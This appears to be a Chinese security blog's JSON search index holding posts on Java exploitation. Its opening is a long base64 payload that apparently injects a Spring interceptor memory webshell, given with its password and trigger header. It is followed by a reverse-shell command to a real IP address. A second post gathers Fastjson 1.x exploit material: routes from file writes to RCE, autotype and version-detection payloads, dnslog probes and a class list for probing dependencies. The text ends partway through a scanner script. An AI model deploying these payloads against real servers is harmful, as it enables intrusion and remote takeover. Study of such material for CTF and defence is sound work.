SUE1RmtzR3hqTEM5SndEWUd1OWhPYWpsUXgra3lHbDFiQWxralprWTJUcHVFcG1tVDdsdTZwSHU2a1JaS1NRb3loSWJTNWVtSC9xRSsvZEwwdlRPeThDTFgrZERIZm1idWNzNTd6bjNQY2tmLy9NKzdkd0IwNE84Q2s2WTFsOUNMdXBHVkNUdWJzOHlFWVM2Wmprek1tNWxTWGlaU3VmbGlYaDZYdHJSeWVqNzN2TFRzZHBuc2FPOU9wOU95UjNZbDVSRTkyWjVzN3pCNk90cDdqaHpwN08zV0lBUjJudFVYOUVSZUw4d2xodks2YlkrWmVrWmFHdndDU1dYU0xscTV3dHlzcGMvTFJkTTZsMWlVNlFSdExPU2xreGl3bHdyR2lGN0k1S1UxV25Da1pjaWlZMUs1VGtETUVUczZNeGdiVzJlZ1h5QXdaR2Frd1BheFhFRk9sT2JUMHByUzAzbXVSTVpNUTgrZjFua0V6aXVMQVNlYnN3V214djcvRE5BWGtSYnd6UXdLTkdUa0xQMXhmUlRZVGRkSFJ6YzZIOFlEZURDRUFDSUM5WS9uQ2publNZSG02SG81ajhYKzJHa2FNSWkyeVg0WUQyR25RbXNVOEVkanA5VzhXYzFiQkxZVkxlbHhLNUR4REZ5b01wOTFuR0ppaEkrVXR6QXB6NWVrN2ZSdktXWVh6WUl0KzFmNTgxVDZyRFNjL3RpekFqdnVyUTVmVUxITW1RVU5ld1EwVzlvMkp3SjdON2ZnU3BCUnY1aytxNExyZ3BXY1hENHhyaGU1dnJPaWFsaEx6SkxFVUs2WUpRVUV0enpuQlI3N2dLY1VDRnFWa3doc1RVM2x6TFNVOVhKVkpkb0dBZ1R1U3ptNmNZN09WaEl2bEpVcVNoTk0vYlVhS1VmVkJLTjNDRzNiNEVOQ1lQOEg4bHhEQndNN0o1MFJGMW5nUUhRamJLeVdwY1BvYWtBbmpqQlBQYTlPNi9tU0RDUHBlZEFqOE1CNkxRMTlKTW93QzQ2ZUt6Q2xXOVprYVZhM1VzcXBnaUVaK3pBZXh4TWg5SVBaSEtKL3FaVjRQeEtOYlJYeE1JNWhRRG5ISW5yd1h0QkhkRHRMTGpVY0QyRVlMVUVjSU1OcmNrTERDTE9sV0dMa2U2SWJBMUlqUnpjdWhmRlJuR3JBS01hQ2lBYXhqL1ZXQ3VKcGRvMGl5eXlNU1krZmxNREQvL3NZR3A0aFczVEdKWmE1V0NNeU5UeGl5WjdCeHh0d0d0TTh5OEJ3S29pWlNpR3R5M1FObjJEd3lPMW93WFowMGk0UTJ6VDY2NnNrakUvaDB5RjhFcnJBbmpVQ2RsRWFpWlEwTE9tY2trc3B6alN3NHdScGFIREprWXg3SUJxYkdReERZbFlGZU03cmJUVU11OTBuRjBJR0xOK0FhbTFLZE5TVHRLVlJzbkxPVW9KR1hORTg1cFUvaFRXSjU3R2lvZWc1VU9tbE82SzErcWdGTzRUem9KSHQ2elkxTEFqY3Y2THZ0VXFCcG8wbzFTNTZBVXNoTE9MNUVFUGQ2RlhZWktYQ21sZlVjbVppc0RRN0t5Mlo4ZmFvOXdKZVZJbjdrc0N1MmpJYVB1YzJHejJqN2lxQmg2STFxL1B6ZUNXRWwvRUZtazUzZHgyWGhudS83YW9WWGhXS1YvR2E4dlJMN0VnWjgwU3VvT2Q1bWFpN1VtMStCVjlWeEg0dERBMUJKZllOcGsxQkx0NUxtN1ZPVkF2aFcvaTJJdUU3eEdKaDYzbGJYY0MxR24wWTM4WDNGUGZmWjdGWEc3MnR2SEU5SjJ2MWFkMlczVjBzNkZyWDk0SnVkYS8wODNYWEJiZDlhVUxWTGFneTByQzlraDl0cXVqYkJsM1VJSDVCVzdObXBiUHUzNklIcmlUTXIvQnJkYjdmZUIzS0k5a0s0aTMyNXBrTjRocCs1K1hCdUhTeVprYmdXQTByRzlWVzI3WGtiSjZFSlR3RU9uQUZ2MWNPWEdWR3oyemtWY00xZ2NiTjFEVzhRMVp6aFFYekhJL2NXeU11TlNCcmh2azZib1R3UjVRSjU0VXJpSnZNTmJ0VWFKdlAyVWJiNEVCcWVDVUhTYys3QW1GUHpzdnNJUDdFa0JpSDIyY3pQY251WktlUjdqQTZrMEhjSWQ2QW9hSVl4RjFTbDVtY3RtMTl4SndPNHEvWXh6UU1nQkx3ODhtZXlxOVNvVzQvOTUxMDMzVWNNV1A1M01iWkU1VDM4YjB0M3VwdnZiT01IZGM0OFNIRVp6MUZnR1kwOExuTEUwSVk5d0h1Nkg1czU3NVFIMFlWcUtjclVJM3gxbVUweFNOL3ZvR3BlT1F2TjlBZWovenRCbnJmcmlLSFhMazkySTI5cTlBYnEraU5YTmxkUVcrdW9BKzdSd0oyeDVmeG9hM0JQMEtJUjEzd3NLZFdBUmY0TUI2bUJDSEZMSStvY2UxNmEvdzYybStoMjRkLzRLMTdFdzU2eXpqNkJsNXZ2WVVoZ2I3QWJReFBMK05FWDExVFhlUWtGOGY5T01QaHhNSHE4S21tUUdVY2lIeU1BRk8zOEt3ZmtlZHVJdDFYMzFSZmR4dVphYlZjUmpieTNETE9sV0hlaG04NlhrYXBqTThzNDdOTjlmRXpSTDRvVU1ZWGIrTExaWHk5akcrVzhYcFRYUmsvT0hNSmRYMEIvNVhBRlo1a0h5N2pLaW4wdStmdVkwaUF4N2dhNDErYzdiS1YwVDJJRWNaL2lwSFhrVUFXN1hpUnYxTXU4enZsS2lXdW9RdnZvTnZsYVlSY3hOZ2M5K0VSQnJJVFMrVHdVV1pMRmtQa2NqKzVJbFBWRUYzSEFkb1M3aWhLUFo4N2l0T21uelpWRlB6L3dsVU5lL25UNVEzT1ZWYnVKZXRzcVJYMm55RmlIWGRlRVdPUlg5N0VwZkdEa2QrS3U3aGN4aDhPOHYxMkdjc1RoMGhMNUZiZ1BTeE8reVA5S1c0ZDR1VDh0RC9POGZKZHZPbjlqMTNDMFluSWJSZUVUUFVGbWdKSzhiM1ZpazJCVFRUSlorczErdVRqT1UvUXg1TzhiUzVXV2Uza2ljSHIySWVqckpsamFNRUE1VVlwT1VqSjR4aG5ZcVk0ZTRIOFhlVEt5emhWWmJPRnpQelFaU1NJSi9Fai9GaDk0SkFqdFJhZzV1SEsya25pL3dRL3BSelp3TS9jS3ZVUjZlZHVpU2syWS9DL1R5TStEV3hmYjBLUTEvZlJpMEJsenFtNzltK3NKaHYvQlQ0b2htU1hEZ0FBCAARAQAGPGluaXQ+AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWDAATABQKABAAFQEAAygpVgEAE2phdmEvbGFuZy9FeGNlcHRpb24HABgMABMAFwoABAAaAQAKZ2V0Q29udGV4dAEAFCgpTGphdmEvbGFuZy9PYmplY3Q7DAAcAB0KAAIAHgEADmdldEludGVyY2VwdG9yDAAgAB0KAAIAIQEADmFkZEludGVyY2VwdG9yAQAnKExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvT2JqZWN0OylWDAAjACQKAAIAJQEAIGphdmEvbGFuZy9DbGFzc05vdEZvdW5kRXhjZXB0aW9uBwAnAQAramF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvblRhcmdldEV4Y2VwdGlvbgcAKQEAH2phdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb24HACsBACBqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbgcALQEAEGphdmEvbGFuZy9UaHJlYWQHAC8BAA1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1RocmVhZDsMADEAMgoAMAAzAQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwwANQA2CgAwADcBADxvcmcuc3ByaW5nZnJhbWV3b3JrLndlYi5jb250ZXh0LnJlcXVlc3QuUmVxdWVzdENvbnRleHRIb2xkZXIIADkBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIHADsBAAlsb2FkQ2xhc3MBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7DAA9AD4KADwAPwEAFGdldFJlcXVlc3RBdHRyaWJ1dGVzCABBAQAMaW52b2tlTWV0aG9kAQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsMAEMARAoAAgBFAQAKZ2V0UmVxdWVzdAgARwEACmdldFNlc3Npb24IAEkBABFnZXRTZXJ2bGV0Q29udGV4dAgASwEAQm9yZy5zcHJpbmdmcmFtZXdvcmsud2ViLmNvbnRleHQuc3VwcG9ydC5XZWJBcHBsaWNhdGlvbkNvbnRleHRVdGlscwgATQEAGGdldFdlYkFwcGxpY2F0aW9uQ29udGV4dAgATwEAD2phdmEvbGFuZy9DbGFzcwcAUQEAHGphdmF4LnNlcnZsZXQuU2VydmxldENvbnRleHQIAFMBAF0oTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMAEMAVQoAAgBWAQAxb3JnLnNwcmluZ2ZyYW1ld29yay5jb250ZXh0LnN1cHBvcnQuTGl2ZUJlYW5zVmlldwgAWAEAC25ld0luc3RhbmNlDABaAB0KAFIAWwEAE2FwcGxpY2F0aW9uQ29udGV4dHMIAF0BAAVnZXRGVgwAXwBECgACAGABABdqYXZhL3V0aWwvTGlua2VkSGFzaFNldAcAYgEACGl0ZXJhdG9yAQAWKClMamF2YS91dGlsL0l0ZXJhdG9yOwwAZABlCgBjAGYBABJqYXZhL3V0aWwvSXRlcmF0b3IHAGgBAARuZXh0DABqAB0LAGkAawEANW9yZy5zcHJpbmdmcmFtZXdvcmsud2ViLmNvbnRleHQuV2ViQXBwbGljYXRpb25Db250ZXh0CABtAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7DABvAHAKAAQAcQEAEGlzQXNzaWduYWJsZUZyb20BABQoTGphdmEvbGFuZy9DbGFzczspWgwAcwB0CgBSAHUBABNqYXZhL2xhbmcvVGhyb3dhYmxlBwB3DAAJAAYKAAIAeQwADAAGCgACAHsBAAxkZWNvZGVCYXNlNjQBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCDAB9AH4KAAIAfwEADmd6aXBEZWNvbXByZXNzAQAGKFtCKVtCDACBAIIKAAIAgwEAC2RlZmluZUNsYXNzCACFAQACW0IHAIcBABFqYXZhL2xhbmcvSW50ZWdlcgcAiQEABFRZUEUBABFMamF2YS9sYW5nL0NsYXNzOwwAiwCMCQCKAI0BABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsMAI8AkAoAUgCRAQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kBwCTAQANc2V0QWNjZXNzaWJsZQEABChaKVYMAJUAlgoAlACXAQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsMAJkAmgoAigCbAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DACdAJ4KAJQAnwEAB2dldEJlYW4IAKEBABxyZXF1ZXN0TWFwcGluZ0hhbmRsZXJNYXBwaW5nCACjAQATYWRhcHRlZEludGVyY2VwdG9ycwgApQEAE2phdmEvdXRpbC9BcnJheUxpc3QHAKcBAANhZGQBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoMAKkAqgoAqACrAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcggArQEAB2Zvck5hbWUMAK8APgoAUgCwAQAMZGVjb2RlQnVmZmVyCACyAQAJZ2V0TWV0aG9kDAC0AJAKAFIAtQEAEGphdmEudXRpbC5CYXNlNjQIALcBAApnZXREZWNvZGVyCAC5AQAGZGVjb2RlCAC7AQAdamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW0HAL0KAL4AGgEAHGphdmEvaW8vQnl0ZUFycmF5SW5wdXRTdHJlYW0HAMABAAUoW0IpVgwAEwDCCgDBAMMBAB1qYXZhL3V0aWwvemlwL0daSVBJbnB1dFN0cmVhbQcAxQEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgwAEwDHCgDGAMgBAARyZWFkAQAFKFtCKUkMAMoAywoAxgDMAQAFd3JpdGUBAAcoW0JJSSlWDADOAM8KAL4A0AEAC3RvQnl0ZUFycmF5AQAEKClbQgwA0gDTCgC+ANQBAAVzZXRGVgEAOShMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL09iamVjdDspVgEABGdldEYBAD8oTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsMANgA2QoAAgDaAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQHANwBAANzZXQMAN4AJAoA3QDfCgDdAJcBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwA4gDjCgDdAOQBAB5qYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb24HAOYBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7DADoAOkKAFIA6gEADWdldFN1cGVyY2xhc3MMAOwAcAoAUgDt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&quot;&#125;基础信息:密码: KjcpzZfSz请求路径: /*请求头: Accept: dRYssaHoY脚本类型: JSP\n\n\n\n成功注入：\n\n注意事项如果采用回显马，这里每次发送完请求后要重新生成，不然会因为重复加载相同类名报错。\n反弹shell时，由于这里使用的是&#x2F;bin&#x2F;sh，所以命令要写成：\n/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/154.8.172.164/7777 0&gt;&amp;1&#x27;\n\n去调用bash来识别 &gt;&amp;\n参考https://mp.weixin.qq.com/s/9e0V4bnV6fuGAfO1AKLYdw\nhttps://mp.weixin.qq.com/s/3wBOOlcHN5cX8mqw7J-yXA\nhttp://www.bmth666.cn/2025/12/30/Fastjson-commons-io%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/\n","categories":["CTF-Java"],"tags":["CTF-Java"]},{"title":"Fastjson1全版本漏洞利用总结","url":"/2026/02/18/Fastjson1%E5%85%A8%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/","content":"前言网上很多fastjson的文章由于时间原因，对利用链的整理都不是很齐全，所以笔者自己做个整理，方便复习和利用。\n这里主要做整理，并简要分析几个关键版本的绕过原理，力求让读者能够在简单理解的基础上快速对相应版本进行利用。\n文章涉及的部分代码见：https://github.com/1diot9/MyJavaSecStudy/tree/main/fastjson/fastjson\n反序列化流程如果一个字段在public构造函数中，且也有setter方法，那么它是通过哪种方式反序列化的？\n存在无参构造\nFastjson 首先调用无参构造函数 (new ClassName()) 实例化对象。\n解析 JSON 中的键值对。\n通过反射调用该字段对应的 Setter 方法 (setFieldName(…)) 将值注入。\n此时有参构造被忽略\n\n不存在无参构造\nFastjson 检测到没有无参构造，会尝试匹配参数最多的有参构造函数。\n解析 JSON 数据，提取出对应构造函数参数的值。\n调用有参构造函数 (new ClassName(arg1, arg2…)) 实例化对象。\n但是，如果 JSON 中还有其他不在构造函数参数列表中的字段，且那些字段有 Setter，则会在对象实例化后调用那些字段的 Setter。\n\n使用了 @JSONCreator 注解\n如果在构造函数（或静态工厂方法）上标记了 @JSONCreator，Fastjson 会强制使用该构造函数进行反序列化，无论是否存在无参构造或 Setter。此时值是通过构造函数注入的。不过这个在安全研究场景中比较少见。\n\n所以可以利用setter或者有参构造。有参构造是从json内层执行到外层的。\nKCON2022：\n\nparse和parseObjectFastjson源码分析 | 1diot9’s Blog \nparse和多参parseObject是一样的，都会调用setter以及符合要求的getter。\n单参parseObject会自动触发所有public getter。\nparse反序列化时且不指定类型时，可以通过$ref的方法触发getter。\n默认只能触发public方法，触发开启了Feature.SupportNonPublicField\n写文件如何RCEfastjson高版本利用中，有很多是写文件利用。这就涉及到如何通过写文件进行RCE\nhttps://mp.weixin.qq.com/s/n8RW0NIllcQ0sn3nI9uceA\n可以概括为下面的几个方法。\n\n计划任务，sshkey，需要有root权限\n写jsp等webshell，不适用于jar部署的应用\n写jar覆盖jre&#x2F;lib，最经典的就是charsets.jar的覆盖\t\tPS：无法写入二进制文件时，可以写ascii jar https://github.com/c0ny1/ascii-jar\n写jre classes，需要知道和创建目录，且需要入口点\n写classes + SPI，需要知道目录和创建目录\n写tomcat-docbase class，需要知道目录，且需要特定classloader（基本限制在fastjson利用）\n\n其中方法3-5都只能在jdk8下生效。\n探测fastjson判断\n根据报错信息判断\n\n破坏json结果，查看报错回显\n&#123;&quot;age&quot;:20,&quot;name&quot;:&quot;Bob&quot;\n\n\n\n利用@type，检测autotype是否开启：\n&#123;&quot;@type&quot;:&quot;whatever&quot;&#125;\n\n\n\n\n根据解析变化判断\n\n&#123;&quot;a&quot;:new a(1),&quot;b&quot;:x&#x27;11&#x27;,/*\\*\\/&quot;c&quot;:Set[&#123;&#125;&#123;&#125;],&quot;d&quot;:&quot;\\u0000\\x00&quot;&#125;&#123;&quot;ext&quot;:&quot;blue&quot;,&quot;name&quot;:&#123;&quot;$ref&quot;:&quot;$.ext&quot;&#125;&#125;\n\n\n\ndns请求\n\n不出网时，也可以根据响应时间是否变长来判断\n&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;\n\n\n\n\n区别jackson\n\n// 多余的类成员: 添加一个键值 test，jackson会报错，fastjson不会&#123;&quot;age&quot;:20,&quot;name&quot;:&quot;Bob&quot;,&quot;test&quot;:1&#125;// jackson 不支持单引号作为界定符&#123;&quot;age&quot;:20,&#x27;name&#x27;:&#x27;Bob&#x27;&#125;// jackson 可以使用注释符/*#，fastjson 会报错，fastjson的注释符是 //&#123;    &quot;age&quot;:20,    &quot;name&quot;:&#x27;Bob&#x27;&#125;/*#aaaa// jackson 会丢失精度&#123;    &quot;age&quot;:20.111111111111111111111111111,    &quot;name&quot;:&#x27;Bob&#x27;&#125;\n\n\n\n\n区别gson\n\n// 浮点类型精度丢失&#123;a:1.111111111111111111111111111&#125;// 注释符#\\r\\n&#123;a:1&#125;\n\n\n\n区别org.json\n\n// 特殊字符&#123;a:&#x27;\\r&#x27;&#125;\n\n\n版本探测https://mp.weixin.qq.com/s/jbkN86qq9JxkGNOhwv9nxA\n\nautotype探测\n\n&#123;&quot;xxx&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;&quot;&#125;&#125;&#123;&quot;xxx&quot;:&#123;&quot;@type&quot;:&quot;Random.String&quot;&#125;&#125;\n\n在开启AutoType的时候 payload1会报错，payload2不报错autoType is not support. java.lang.Class\n未开启AutoType的时候 payload1不报错，payload2报错autoType is not support. Random.String\n\nAutoCloseable精确探测\n\n&#123;  &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;\n\n注意：在FastJson版本1.2.76后，就算用这种方式，探测出来的也都是1.2.76\n\n1.2.83具体探测\n\n&#123;&quot;xxx&quot;:&#123;&quot;@type&quot;:&quot;Test.TestException&quot;&#125;&#125;\n\n只有1.2.83时不报错。\n\ndnslog探测大致版本\n\n//  &lt;=1.2.47[  &#123;    &quot;@type&quot;: &quot;java.lang.Class&quot;,    &quot;val&quot;: &quot;java.io.ByteArrayOutputStream&quot;  &#125;,  &#123;    &quot;@type&quot;: &quot;java.io.ByteArrayOutputStream&quot;  &#125;,  &#123;    &quot;@type&quot;: &quot;java.net.InetSocketAddress&quot;  &#123;    &quot;address&quot;:,    &quot;val&quot;: &quot;aaa.xxxx.ceye.io&quot;  &#125;&#125;]//  &lt;=1.2.68[  &#123;    &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,    &quot;@type&quot;: &quot;java.io.ByteArrayOutputStream&quot;  &#125;,  &#123;    &quot;@type&quot;: &quot;java.io.ByteArrayOutputStream&quot;  &#125;,  &#123;    &quot;@type&quot;: &quot;java.net.InetSocketAddress&quot;  &#123;    &quot;address&quot;:,    &quot;val&quot;: &quot;bbb.n41tma.ceye.io&quot;  &#125;&#125;]//  &lt;=1.2.80 只收到第一个dns请求，1.2.83 收到两个dns请求[  &#123;    &quot;@type&quot;: &quot;java.lang.Exception&quot;,    &quot;@type&quot;: &quot;com.alibaba.fastjson.JSONException&quot;,    &quot;x&quot;: &#123;      &quot;@type&quot;: &quot;java.net.InetSocketAddress&quot;  &#123;    &quot;address&quot;:,    &quot;val&quot;: &quot;ccc.4fhgzj.dnslog.cn&quot;  &#125;&#125;&#125;,  &#123;    &quot;@type&quot;: &quot;java.lang.Exception&quot;,    &quot;@type&quot;: &quot;com.alibaba.fastjson.JSONException&quot;,    &quot;message&quot;: &#123;      &quot;@type&quot;: &quot;java.net.InetSocketAddress&quot;  &#123;    &quot;address&quot;:,    &quot;val&quot;: &quot;ddd.4fhgzj.dnslog.cn&quot;  &#125;&#125;&#125;]\n\n\n\n5、不出网探测，根据响应是500还是正常判断\n【不报错】1.2.83/1.2.24 【报错】1.2.25-1.2.80&#123;&quot;zero&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Exception&quot;,&quot;@type&quot;:&quot;org.XxException&quot;&#125;&#125;【不报错】1.2.24-1.2.68 【报错】1.2.70-1.2.83&#123;&quot;zero&quot;:&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;java.io.ByteArrayOutputStream&quot;&#125;&#125;【不报错】1.2.24-1.2.47 【报错】1.2.48-1.2.83&#123;    &quot;a&quot;: &#123;        &quot;@type&quot;: &quot;java.lang.Class&quot;,         &quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;    &#125;,     &quot;b&quot;: &#123;        &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;    &#125;&#125;【不报错】1.2.24 【报错】1.2.25-1.2.83&#123;&quot;zero&quot;: &#123;&quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;&#125;\n\n\n\n依赖探测\nCharacter转换报错\n\n&#123;  &quot;x&quot;: &#123;    &quot;@type&quot;: &quot;java.lang.Character&quot;&#123;  &quot;@type&quot;: &quot;java.lang.Class&quot;,  &quot;val&quot;: &quot;org.springframework.web.bind.annotation.RequestMapping&quot;&#125;&#125;\n\n类存在报错can not cast，不存在就是No message available\n一些相关依赖类：\norg.springframework.web.bind.annotation.RequestMapping  //SpringBootorg.apache.catalina.startup.Tomcat  //Tomcatgroovy.lang.GroovyShell  //Groovy - 1.2.80com.mchange.v2.c3p0.DataSources  //C3P0org.apache.ibatis.datasource.unpooled.UnpooledDataSource  //mybatisorg.h2.jdbcx.JdbcDataSource //h2com.mysql.jdbc.Buffer  //mysql-jdbc-5com.mysql.cj.api.authentication.AuthenticationProvider  //mysql-connect-6com.mysql.cj.protocol.AuthenticationProvider //mysql-connect-8jdk.nashorn.tools.Shell  //JDK8java.net.http.HttpClient  //JDK11com.sun.org.apache.bcel.internal.util.ClassLoader   // &lt;= jdk8u251org.apache.ibatis.type.Alias  //Mybatisorg.apache.tomcat.dbcp.dbcp.BasicDataSource  //tomcat-dbcp-7-BCELorg.apache.tomcat.dbcp.dbcp2.BasicDataSource //tomcat-dbcp-8及以后-BCELorg.apache.commons.dbcp.BasicDataSource //commons-dbcp &lt;= 1.4org.apache.commons.dbcp2.BasicDataSource //commons-dbcp2 &lt;= 2.13.0org.apache.commons.io.ByteOrderMark       //commons-io-通用类,不确定版本org.apache.commons.io.Java7Support        //commons-io-2.5独有org.apache.commons.io.IOIndexedException  //commons-io-2.7独有org.apache.commons.io.file.Counters       //commons-io-2.7-2.8独有org.apache.commons.io.FileSystem          //commons-io-2.7独有org.apache.commons.io.file.PathUtils      //commons-io-2.7独有org.apache.commons.io.function.IOConsumer //commons-io-2.7独有org.aspectj.ajde.Ajde  //aspectjtoolscom.fasterxml.jackson.core.exc.InputCoercionException   //jacksonorg.python.antlr.ParseException //jythonorg.postgresql.jdbc.PgConnection    //postgre\n\n\n\n脚本：\nimport requestsimport osdef jar_scanner(url: str, timeout: int = 10) -&gt; list:    &quot;&quot;&quot;    扫描目标URL的fastjson依赖库    Args:        url: 目标URL        timeout: 请求超时时间（秒）    Returns:        list: 检测到的依赖列表    &quot;&quot;&quot;    base_dir = os.path.dirname(os.path.abspath(__file__))    jar_list_path = os.path.join(base_dir, &quot;poc&quot;, &quot;jarList.txt&quot;)    jar_scan_path = os.path.join(base_dir, 